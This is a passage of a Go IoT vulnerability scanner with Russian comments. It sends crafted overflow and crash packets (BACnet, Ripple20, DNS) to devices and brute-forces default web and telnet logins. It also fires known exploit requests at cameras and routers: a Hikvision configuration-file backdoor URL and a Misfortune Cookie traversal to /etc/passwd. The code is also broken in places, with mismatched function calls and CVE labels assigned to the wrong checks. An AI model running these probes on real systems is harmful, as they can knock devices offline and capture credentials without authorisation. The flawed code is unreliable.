    if _, err := conn.Write(modbusRequest); err != nil {
        return false
    }

    n, err = conn.Read(buf)
    return err == nil && n > 0
}

func testBACnetVulnerability(ip string) bool {
    conn, err := net.DialTimeout("udp", net.JoinHostPort(ip, "47808"), scanTimeout)
    if err != nil {
        return false
    }
    defer conn.Close()

    // Специальный BACnet-пакет для проверки уязвимости
    maliciousPacket := []byte{
        0x81, 0x0a, 0x00, 0x2e, 0x01, 0x20, 0xff, 0xff, 
        0x00, 0xff, 0x10, 0x00, 0xc4, 0x02, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    }

    if _, err := conn.Write(maliciousPacket); err != nil {
        return false
    }

    // Проверяем, не перестало ли устройство отвечать
    time.Sleep(1 * time.Second)
    return !isPortOpen(ip, 47808, "udp", scanTimeout)
}

func checkCommonBackdoors(result *ScanResult) {
    backdoorPorts := map[int]string{
        31337: "Backdoor (Elite)",
        54321: "Backdoor (Net-Devil)",
        60008: "Backdoor (DVR)",
        2222:  "Backdoor (SSH Alt)",
        4444:  "Backdoor (Metasploit)",
    }
    for port, desc := range backdoorPorts {
        if portIsInList(result.Device.OpenPorts, port) {
            vuln := Vulnerability{
                Name:        "Potential Backdoor",
                Description: desc,
                Severity:    "Critical",
                CVE:         "N/A",
                Port:        port,
                Protocol:    "tcp",
            }
            result.Vulnerabilities = append(result.Vulnerabilities, vuln)
        }
    }
}

func checkRipple20(result *ScanResult) {
    for _, port := range result.Device.OpenPorts {
        if port == 80 || port == 443 || port == 7547 {
            if testRipple20Vulnerability(result.Device.IP, port) {
                vuln := Vulnerability{
                    Name:        "Ripple20 TCP/IP Stack Vulnerabilities",
                    Description: "Уязвимости в стеке TCP/IP Treck (DNS, IPv4, ICMP)",
                    Severity:    "Critical",
                    CVE:         "CVE-2020-11896,CVE-2020-11898",
                    Port:        port,
                    Protocol:    "tcp",
                }
                result.Vulnerabilities = append(result.Vulnerabilities, vuln)
            }
        }
    }
}

func testRipple20Vulnerability(ip string, port int) bool {
    // Проверка через специальный DNS-запрос (CVE-2020-11896)
    if port == 53 && testRipple20DNS(ip) {
        return true
    }

    // Проверка через аномальные TCP-пакеты (CVE-2020-11898)
    conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, strconv.Itoa(port)), scanTimeout)
    if err != nil {
        return false
    }
    defer conn.Close()

    // Специфичный для Treck TCP-пакет
    maliciousPacket := []byte{
        0x00, 0x00, 0x00, 0x00, // Аномальные флаги
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x08, 0x00,
        0x45, 0x00, 0x00, 0x54,
    }

    if _, err := conn.Write(maliciousPacket); err != nil {
        return false
    }

    // Читаем ответ (уязвимые устройства часто закрывают соединение)
    buf := make([]byte, 1024)
    _, err = conn.Read(buf)
    if err != nil && err != io.EOF {
        return false
    }

    // Альтернативная проверка через HTTP-заголовки
    if port == 80 || port == 443 {
        client := newHTTPClient()
        url := fmt.Sprintf("http://%s:%d", ip, port)
        resp, err := client.Get(url)
        if err != nil {
            return false
        }
        defer resp.Body.Close()

        serverHeader := resp.Header.Get("Server")
        return strings.Contains(serverHeader, "Treck") || 
               strings.Contains(serverHeader, "uIP") ||
               strings.Contains(serverHeader, "Zephyr")
    }

    return false
}

func testRipple20DNS(ip string) bool {
    conn, err := net.DialTimeout("udp", net.JoinHostPort(ip, "53"), scanTimeout)
    if err != nil {
        return false
    }
    defer conn.Close()

    // Специальный DNS-запрос, вызывающий переполнение в Treck
    maliciousDNS := []byte{
        0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x41, 0x01, 0x41,
        0x01, 0x41, 0x01, 0x41, 0x01, 0x41, 0x01, 0x41,
        0x01, 0x41, 0x01, 0x41, 0x01, 0x41, 0x01, 0x41,
        0x01, 0x41, 0x01, 0x41, 0x01, 0x41, 0x01, 0x41,
        0x01, 0x41, 0x01, 0x41, 0x01, 0x41, 0x01, 0x41,
        0x01, 0x41, 0x01, 0x41, 0x01, 0x41, 0x01, 0x41,
        0x01, 0x41, 0x01, 0x41, 0x01, 0x41, 0x01, 0x41,
        0x01, 0x41, 0x01, 0x41, 0x01, 0x41, 0x00, 0x00,
        0x01, 0x00, 0x01,
    }

    if _, err := conn.Write(maliciousDNS); err != nil {
        return false
    }

    conn.SetReadDeadline(time.Now().Add(1 * time.Second))
    buf := make([]byte, 1024)
    _, err = conn.Read(buf)
    return err == nil // Уязвимые устройства часто отвечают на такой запрос
}

// -----------------------------------------------------------------------------
// Веб-проверки
// -----------------------------------------------------------------------------

func checkWebServices(result *ScanResult, port int) {
    scheme := "http"
    if port == 443 || port == 8443 {
        scheme = "https"
    }
    url := fmt.Sprintf("%s://%s:%d", scheme, result.Device.IP, port)

    checkWebCredentials(result, url, port)
    if scheme == "https" {
        checkTLSconfig(result, url, port)
    }
    checkCommonWebVulns(result, url, port)
    checkAPIendpoints(result, url, port)
    checkFirmwareUpdates(result, url, port)

    if testWeakWebCredentials(url) {
        vuln := Vulnerability{
            Name:        "Weak Default Web Credentials",
            Description: "Обнаружены слабые учетные данные веб-интерфейса",
            Severity:    "Critical",
            CVE:         "N/A",
            Port:        port,
            Protocol:    "http",
        }
        result.Vulnerabilities = append(result.Vulnerabilities, vuln)
    }

    // Проверки для конкретных устройств
    if result.Device.DeviceType == "ip_camera" {
        checkCameraStream(result, url, port)
    } else if result.Device.DeviceType == "router" {
        checkRouterAdminPanel(result, url, port)
    }
}

func checkWebCredentials(result *ScanResult, url string, port int) {
    client := newHTTPClient()
    for _, cred := range commonCredentials {
        if cred.Service != "http" || cred.Port != port {
            continue
        }
        req, err := http.NewRequest("GET", url, nil)
        if err != nil {
            continue
        }
        req.SetBasicAuth(cred.Username, cred.Password)

        resp, err := client.Do(req)
        if err != nil {
            continue
        }
        resp.Body.Close()

        if resp.StatusCode == http.StatusOK {
            result.FoundCredentials = append(result.FoundCredentials, cred)
            vuln := Vulnerability{
                Name:        "Default Web Credentials",
                Description: fmt.Sprintf("Найдены учетные данные %s:%s", cred.Username, cred.Password),
                Severity:    "Critical",
                Port:        port,
                Protocol:    "http",
            }
            result.Vulnerabilities = append(result.Vulnerabilities, vuln)
        }
    }
}

func checkTLSconfig(result *ScanResult, url string, port int) {
    conn, err := tls.DialWithDialer(
        &net.Dialer{Timeout: scanTimeout},
        "tcp",
        net.JoinHostPort(result.Device.IP, strconv.Itoa(port)),
        &tls.Config{InsecureSkipVerify: true},
    )
    if err != nil {
        return
    }
    defer conn.Close()

    state := conn.ConnectionState()
    if state.Version < tls.VersionTLS12 {
        issue := ConfigurationIssue{
            Issue:       "Outdated TLS Version",
            Description: fmt.Sprintf("Используется устаревшая версия TLS (%s)", tlsVersionToString(state.Version)),
            Severity:    "High",
            Port:        port,
            Protocol:    "https",
        }
        result.ConfigurationIssues = append(result.ConfigurationIssues, issue)
    }

    weakCiphers := map[uint16]bool{
        tls.TLS_RSA_WITH_RC4_128_SHA:            true,
        tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA:       true,
        tls.TLS_RSA_WITH_AES_128_CBC_SHA:        true,
        tls.TLS_RSA_WITH_AES_256_CBC_SHA:        true,
        tls.TLS_ECDHE_RSA_WITH_RC4_128_SHA:      true,
        tls.TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA: true,
    }
    if weakCiphers[state.CipherSuite] {
        issue := ConfigurationIssue{
            Issue:       "Weak Cipher Suite",
            Description: fmt.Sprintf("Используется слабый шифр: %s", tls.CipherSuiteName(state.CipherSuite)),
            Severity:    "High",
            Port:        port,
            Protocol:    "https",
        }
        result.ConfigurationIssues = append(result.ConfigurationIssues, issue)
    }

    if len(state.PeerCertificates) > 0 {
        cert := state.PeerCertificates[0]
        if bytes.Equal(cert.RawSubject, cert.RawIssuer) {
            issue := ConfigurationIssue{
                Issue:       "Self-Signed Certificate",
                Description: "Используется самоподписанный SSL-сертификат",
                Severity:    "Medium",
                Port:        port,
                Protocol:    "https",
            }
            result.ConfigurationIssues = append(result.ConfigurationIssues, issue)
        }
    }
}

func checkCommonWebVulns(result *ScanResult, url string, port int) {
    if strings.HasPrefix(url, "http://") {
        issue := SecurityIssue{
            Issue:       "Unencrypted Web Interface",
            Description: "Веб-интерфейс использует HTTP вместо HTTPS",
            Severity:    "Medium",
            Port:        port,
            Protocol:    "http",
        }
        result.SecurityIssues = append(result.SecurityIssues, issue)
    }
}

func checkAPIendpoints(result *ScanResult, url string, port int) {
    endpoints := []string{"/api", "/rest", "/v1", "/v2", "/graphql", "/soap", "/xmlrpc"}
    client := newHTTPClient()
    for _, endpoint := range endpoints {
        fullURL := url + endpoint
        resp, err := client.Get(fullURL)
        if err != nil {
            continue
        }
        resp.Body.Close()
        if resp.StatusCode == http.StatusOK {
            if !strings.Contains(resp.Header.Get("WWW-Authenticate"), "Basic") {
                vuln := Vulnerability{
                    Name:        "Open API Endpoint",
                    Description: fmt.Sprintf("Открытый API без аутентификации: %s", endpoint),
                    Severity:    "High",
                    Port:        port,
                    Protocol:    "http",
                }
                result.Vulnerabilities = append(result.Vulnerabilities, vuln)
            }
        }
    }
}

func checkFirmwareUpdates(result *ScanResult, url string, port int) {
    if strings.HasPrefix(url, "http://") {
        issue := SecurityIssue{
            Issue:       "Firmware Updates via HTTP",
            Description: "Обновления прошивки через HTTP",
            Severity:    "High",
            Port:        port,
            Protocol:    "http",
        }
        result.SecurityIssues = append(result.SecurityIssues, issue)
    }

    updatePaths := []string{"/firmware_upgrade", "/fw_upgrade", "/upload", "/upgrade", "/update"}
    client := newHTTPClient()
    for _, path := range updatePaths {
        fullURL := url + path
        resp, err := client.Get(fullURL)
        if err != nil {
            continue
        }
        resp.Body.Close()
        if resp.StatusCode == http.StatusOK {
            issue := SecurityIssue{
                Issue:       "Exposed Firmware Update Endpoint",
                Description: fmt.Sprintf("Открытый endpoint обновления: %s", path),
                Severity:    "Critical",
                Port:        port,
                Protocol:    "http",
            }
            result.SecurityIssues = append(result.SecurityIssues, issue)
            break
        }
    }
}

func testWeakWebCredentials(url string) bool {
    client := newHTTPClient()
    for _, cred := range commonCredentials {
        if cred.Service != "http" {
            continue
        }
        req, err := http.NewRequest("GET", url, nil)
        if err != nil {
            continue
        }
        req.SetBasicAuth(cred.Username, cred.Password)
        resp, err := client.Do(req)
        if err != nil {
            continue
        }
        resp.Body.Close()
        if resp.StatusCode == http.StatusOK {
            return true
        }
    }
    return false
}

func checkCameraStream(result *ScanResult) {
    if result.Device.DeviceType != "ip_camera" {
        return
    }

    // Проверка CVE-2021-36260 (Hikvision)
    if testHikvisionVulnerability(result.Device.IP) {
        vuln := Vulnerability{
            Name:        "Hikvision Command Injection (CVE-2021-36260)",
            Description: "Позволяет выполнить произвольные команды через HTTP-запрос",
            Severity:    "Critical",
            CVE:         "CVE-2021-36260",
            Port:        80,
            Protocol:    "http",
        }
        result.Vulnerabilities = append(result.Vulnerabilities, vuln)
    }

    // Проверка CVE-2017-7921 (Hikvision)
    if testHikvisionAuthBypass(result.Device.IP) {
        vuln := Vulnerability{
            Name:        "Hikvision Authentication Bypass (CVE-2017-7921)",
            Description: "Обход аутентификации через специальный URL",
            Severity:    "Critical",
            CVE:         "CVE-2017-7921",
            Port:        80,
            Protocol:    "http",
        }
        result.Vulnerabilities = append(result.Vulnerabilities, vuln)
    }
}

func testHikvisionVulnerability(ip string) bool {
    client := newHTTPClient()
    url := fmt.Sprintf("http://%s/System/configurationFile?auth=YWRtaW46MTEK", ip)
    resp, err := client.Get(url)
    if err != nil {
        return false
    }
    defer resp.Body.Close()

    // Уязвимые устройства возвращают конфигурационный файл
    return resp.StatusCode == 200 && 
           strings.Contains(resp.Header.Get("Content-Type"), "application/octet-stream")
}

func testHikvisionAuthBypass(ip string) bool {
    client := newHTTPClient()
    url := fmt.Sprintf("http://%s/security/users/1", ip)
    resp, err := client.Get(url)
    if err != nil {
        return false
    }
    defer resp.Body.Close()

    // Проверяем, возвращает ли устройство данные пользователя без аутентификации
    if resp.StatusCode == 200 {
        var data map[string]interface{}
        if err := json.NewDecoder(resp.Body).Decode(&data); err == nil {
            return data["userName"] != nil
        }
    }
    return false
}

func checkRouterAdminPanel(result *ScanResult) {
    if result.Device.DeviceType != "router" {
        return
    }

    // Проверка CVE-2020-29557 (D-Link)
    if testDLinkCredsExposure(result.Device.IP) {
        vuln := Vulnerability{
            Name:        "D-Link Credentials Exposure (CVE-2020-29557)",
            Description: "Конфигурация роутера раскрывает пароль администратора",
            Severity:    "Critical",
            CVE:         "CVE-2020-29557",
            Port:        80,
            Protocol:    "http",
        }
        result.Vulnerabilities = append(result.Vulnerabilities, vuln)
    }

    // Проверка CVE-2014-9222 (Misfortune Cookie)
    if testMisfortuneCookie(result.Device.IP) {
        vuln := Vulnerability{
            Name:        "Misfortune Cookie (CVE-2014-9222)",
            Description: "Уязвимость в обработке заголовков Cookie в Allegro RomPager",
            Severity:    "Critical",
            CVE:         "CVE-2014-9222",
            Port:        80,
            Protocol:    "http",
        }
        result.Vulnerabilities = append(result.Vulnerabilities, vuln)
    }
}

func testDLinkCredsExposure(ip string) bool {
    client := newHTTPClient()
    url := fmt.Sprintf("http://%s/getcfg.php", ip)
    resp, err := client.Get(url)
    if err != nil {
        return false
    }
    defer resp.Body.Close()

    if resp.StatusCode == 200 {
        body, err := io.ReadAll(resp.Body)
        if err != nil {
            return false
        }
        // Проверяем наличие пароля в ответе
        return strings.Contains(string(body), "<password>") && 
               strings.Contains(string(body), "admin")
    }
    return false
}

func testMisfortuneCookie(ip string) bool {
    client := newHTTPClient()
    req, err := http.NewRequest("GET", fmt.Sprintf("http://%s/", ip), nil)
    if err != nil {
        return false
    }

    // Злонамеренный заголовок Cookie
    req.Header.Set("Cookie", "C1073738830=../../../../../../../../../../etc/passwd")

    resp, err := client.Do(req)
    if err != nil {
        return false
    }
    defer resp.Body.Close()

    // Проверяем, не вернуло ли устройство содержимое файла
    body, err := io.ReadAll(resp.Body)
    if err != nil {
        return false
    }
    return strings.Contains(string(body), "root:") || 
           strings.Contains(string(body), "/bin/sh")
}

// -----------------------------------------------------------------------------
// Низкоуровневые функции
// -----------------------------------------------------------------------------

func testTelnetCredentials(ip, user, pass string) bool {
    conn, err := net.DialTimeout("tcp", ip+":23", scanTimeout)
    if err != nil {
        return false
    }
    defer conn.Close()

    conn.SetDeadline(time.Now().Add(scanTimeout))
    buf := make([]byte, 256)
    n, err := conn.Read(buf)
    if err != nil && err != io.EOF {
        return false
    }

    if _, err := conn.Write([]byte(user + "\r\n")); err != nil {
        return false
    }
    n, err = conn.Read(buf)
    if err != nil && err != io.EOF {
        return false
    }

    if strings.Contains(string(buf[:n]), "Password:") || strings.Contains(string(buf[:n]), "password:") {
        if _, err := conn.Write([]byte(pass + "\r\n")); err != nil {
            return false
        }
        n, err = conn.Read(buf)
        if err != nil && err != io.EOF {
            return false
        }
        return !strings.Contains(string(buf[:n]), "Login incorrect") &&
            !strings.Contains(string(buf[:n]), "Access denied")
    }
    return false
}

func isPortOpen(ip string, port int, protocol string, timeout time.Duration) bool {
    address := net.JoinHostPort(ip, strconv.Itoa(port))
    switch strings.ToLower(protocol) {
    case "tcp":
        var conn net.Conn
        var err error
        if proxyDialer != nil {
            conn, err = proxyDialer.Dial("tcp", address)
        } else {
            conn, err = net.DialTimeout("tcp", address, timeout)
        }
        if err == nil {
            conn.Close()
            return true
        }
    case "udp":
        conn, err := net.DialTimeout("udp", address, timeout)
        if err == nil {
            conn.Close()
            return verifyUDPservice(ip, port)
        }
    }
    return false
}

func verifyUDPservice(ip string, port int) bool {
    switch port {
    case 53:
        return checkDNS(ip)
    case 161:
        return checkSNMP(ip, "public", false)
    case 1900:
        return testUPnPVulnerability(ip)
    }
    return false
}

func checkDNS(ip string) bool {
    resolver := &net.Resolver{
        PreferGo: true,
        Dial: func(ctx context.Context, network, addr string) (net.Conn, error) {
            return net.Dial("udp", ip+":53")
        },
    }
    _, err := resolver.LookupHost(context.Background(), "example.com")
    return err == nil
}

func checkSNMP(ip string, community string, v3 bool) bool {
    conn, err := net.DialTimeout("udp", ip+":161", scanTimeout)
    if err == nil {
        conn.Close()
        return true
    }
    return false
}

func newHTTPClient() *http.Client {
    return &http.Client{
        Timeout: scanTimeout,
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
    }
}

func tlsVersionToString(version uint16) string {
    switch version {
    case tls.VersionTLS10:
        return "TLS 1.0"
    case tls.VersionTLS11:
        return "TLS 1.1"
    case tls.VersionTLS12:
        return "TLS 1.2"
    case tls.VersionTLS13:
        return "TLS 1.3"
    default:
        return fmt.Sprintf("Unknown (0x%x)", version)
    }
}

func portIsInList(ports []int, p int) bool {
    for _, port := range ports {
        if port == p {
            return true
        }
    }
    return false
}

// -----------------------------------------------------------------------------
// Вывод и сохранение результатов
// -----------------------------------------------------------------------------

func printReport(result ScanResult) {
    fmt.Printf("\n=== Отчёт по сканированию для %s (%s) ===\n", result.Device.IP, result.Device.DeviceType)
    fmt.Println("Открытые порты:", result.Device.OpenPorts)

    if len(result.Vulnerabilities) > 0 {
        fmt.Println("\n[!] Найденные уязвимости:")
        for _, vuln := range result.Vulnerabilities {
            fmt.Printf(" - [%s] %s (Порт: %d/%s, CVE: %s)\n", vuln.Severity, vuln.Name, vuln.Port, vuln.Protocol, vuln.CVE)
        }
    }

    if len(result.FoundCredentials) > 0 {
        fmt.Println("\n[!] Найденные учетные данные:")
        for _, cred := range result.FoundCredentials {
            fmt.Printf(" - %s: %s/%s (Порт: %d)\n", cred.Service, cred.Username, cred.Password, cred.Port)
        }
    }

    if len(result.SecurityIssues) > 0 {
        fmt.Println("\n[!] Потенциальные проблемы безопасности:")
        for _, issue := range result.SecurityIssues {
            fmt.Printf(" - [%s] %s (Порт: %d/%s)\n", issue.Severity, issue.Issue, issue.Port, issue.Protocol)
        }
    }

    if len(result.ConfigurationIssues) > 0 {
        fmt.Println("\n[!] Проблемы конфигурации:")
        for _, conf := range result.ConfigurationIssues {
            fmt.Printf(" - [%s] %s (Порт: %d/%s)\n", conf.Severity, conf.Issue, conf.Port, conf.Protocol)
        }
    }

    fmt.Printf("\nПолный отчет сохранен в: %s\n", result.ReportFile)
}

func saveResultsToFile(results []ScanResult, filename string) error {
    file, err := os.Create(filename)
    if err != nil {
        return fmt.Errorf("не удалось создать файл: %w", err)
    }
    defer file.Close()

    encoder := json.NewEncoder(file)
    encoder.SetIndent("", "  ")
    if err := encoder.Encode(results); err != nil {
        return fmt.Errorf("не удалось записать результаты: %w", err)
    }
    return nil
}

func executeCommand(cmdStr string) error {
    if strings.ContainsAny(cmdStr, "&|;") {
        return fmt.Errorf("обнаружены опасные символы в команде")
    }

    parts := strings.Fields(cmdStr)
    if len(parts) == 0 {
        return nil
    }

    ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
    defer cancel()

    cmd := exec.CommandContext(ctx, parts[0], parts[1:]...)
    var out bytes.Buffer
    cmd.Stdout = &out
    cmd.Stderr = &out

    if err := cmd.Run(); err != nil {
        return fmt.Errorf("ошибка выполнения команды: %w", err)
    }

    fmt.Printf("Результат команды:\n%s\n", out.String())
    return nil
} 
